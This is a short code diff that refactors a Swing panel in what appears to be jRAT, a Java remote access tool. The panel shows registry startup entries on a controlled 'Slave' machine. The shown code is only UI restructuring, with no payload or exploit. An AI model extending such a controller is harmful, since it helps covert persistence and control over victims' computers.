@@ -1,10 +1,12 @@
-package jrat.controller.ui.panels;
+package jrat.module.system.ui;
 
 import jrat.api.Resources;
+import jrat.api.ui.ClientPanel;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet78RegistryStartup;
 import jrat.controller.ui.DefaultJTable;
 import jrat.controller.ui.components.TableModel;
+import jrat.controller.ui.panels.PanelControlParent;
 
 import javax.swing.*;
 import javax.swing.GroupLayout.Alignment;
@@ -14,7 +16,7 @@ import java.awt.event.ActionListener;
 
 
 @SuppressWarnings("serial")
-public class PanelControlRegStart extends PanelControlParent {
+public class PanelStartup extends ClientPanel {
 
     private TableModel model;
 
@@ -24,8 +26,8 @@ public class PanelControlRegStart extends PanelControlParent {
 		return model;
 	}
 
-	public PanelControlRegStart(Slave sl) {
-		super(sl);
+	public PanelStartup(Slave s) {
+		super(s, "Registry Startup", Resources.getIcon("application-run"));
 
 		JScrollPane scrollPane = new JScrollPane();
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
